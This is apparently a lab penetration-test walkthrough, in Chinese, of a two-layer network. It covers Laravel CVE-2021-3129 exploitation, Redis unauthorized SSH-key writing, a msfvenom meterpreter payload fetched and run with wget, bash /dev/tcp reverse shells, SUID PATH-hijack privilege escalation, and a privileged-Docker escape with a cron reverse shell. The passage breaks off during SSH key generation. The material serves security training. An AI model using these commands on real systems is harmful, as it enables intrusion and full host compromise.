2、DMZ区域渗透

1.探测内网主机IP地址

arp-scan -l

2.通过端口进行扫描测试

nmap -A -sS -sV -v -p- 192.168.1.7
查看开放端口为22、80、81、6379端口

3.通过访问80端口访问，站点为hexo搭建，未找到有用信息

4.查看81端口，服务为Laravel v8.29.0 (PHP v7.4.14)

5.搜索版本漏洞，发现Laravel <= 8.4.2 存在远程代码执行漏洞

6.使用EXP进行操作

git clone https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXPcd laravel-CVE-2021-3129-EXPpython3 laravel-CVE-2021-3129-EXP.py http://192.168.1.7:81

7.使用哥斯拉进行连接

8.查看主机名和判断是否为容器

hostnamecat /proc/self/cgroup

9.使用反弹shell不成功

nc -nlvp 4444bash -i >& /dev/tcp/192.168.1.8/4444 0>&1

反弹不成功主要原因为Ubuntu1服务器的81端口做的反向代理指向到Ubuntu2的靶机上，Ubuntu2无kali的路由

10.查看有redis服务，测试Redis未授权

redis-cli -h 192.168.1.7

11.使用Redis未授权写入SSH公钥

1.在kali上生成公钥

ssh-keygen -t rsa

2.将公钥导入key.txt文件

前后用\n换行，避免和Redis里其他缓存数据混合，再把key.txt文件内容写入目标主机的redis缓冲里

(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > key.txtcat key.txt | redis-cli -h 192.168.1.7 -x set xxx# -x 代表从标准输入读取数据作为该命令的最后一个参数

3.连接Redis服务器，并把公钥写入Redis服务器本地文件

# 连接Redis服务器redis-cli -h 192.168.1.7# 设置redis的备份路径为/root/.ssh/config set dir /root/.ssh# 设置保存文件名为authorized_keysconfig set dbfilename authorized_keys# 将数据保存在目标服务器硬盘上save

4.连接Redis服务器

ssh 192.168.1.7

12.查看IP地址信息

根据IP地址查看有其他网段设备

ifconfig

13.查看Nginx的81端口服务配置信息

由于81端口做的反向代理到192.168.52.20服务器上，服务器到kali没有路由，反弹不会成功

cat /etc/nginx/conf.d/81.conf

14.使用msf生成木马上线Ubuntu1

1.生成Linux木马文件

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f elf > shell.elf

2.创建监听服务

use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lhost 192.168.1.8set lport 4444run -j

3.创建简单http服务器

python3 -m http.server 80

4.在Ubuntu1上下载并执行

wget http://192.168.1.8/shell.elfchmod +x shell.elf./shell.elf

5.查看服务器已经上线

3、第二层网络渗透

1、Ubuntu2(WEB2)渗透

1.由于81端口真实服务在Ubuntu2服务器，需要反弹连接到Ubuntu1中

1.在Ubuntu1中开启监听服务

nc -nlvp 5555

2.反弹shell到Ubuntu1中

bash -c "exec bash -i >& /dev/tcp/192.168.52.10/5555 0>&1"

2.查找suid权限文件

find / -perm -u=s -type f 2>/dev/null# 或者使用如下命令find / -user root -perm -4000 -print 2>/dev/null

3.执行测试shell文件

cd /home/jobs./shell

4.查看同目录下的demo.c文件，初步判断编译后的文件为shell

cat demo.c

5.通过环境变量进行提权

echo "/bin/bash" > /tmp/pschmod 777 /tmp/psexport PATH=/tmp:$PATHcd /home/jobs./shell

6.反弹root权限shell到Ubuntu1服务器上

bash -c "exec bash -i >& /dev/tcp/192.168.52.10/4444 0>&1"

7.docker特权逃逸

特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。

使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。

1.查看磁盘信息

fdisk -l

2.查看设备文件

ls /dev

3.将/dev/sda1挂载到自己创建的文件夹

mkdir /hackmount /dev/sda1 /hackls /hack

4.使用计划任务写入到反弹shell到Ubuntu1

echo '* * * * * bash -i >& /dev/tcp/192.168.52.10/3333 0>&1' >> /hack/var/spool/cron/root

执行后等待一直不成功

5.定时任务不成功，把Ubuntu1秘钥写入到Ubuntu2中

在Ubuntu1生成秘钥

ssh-keygen -f hack
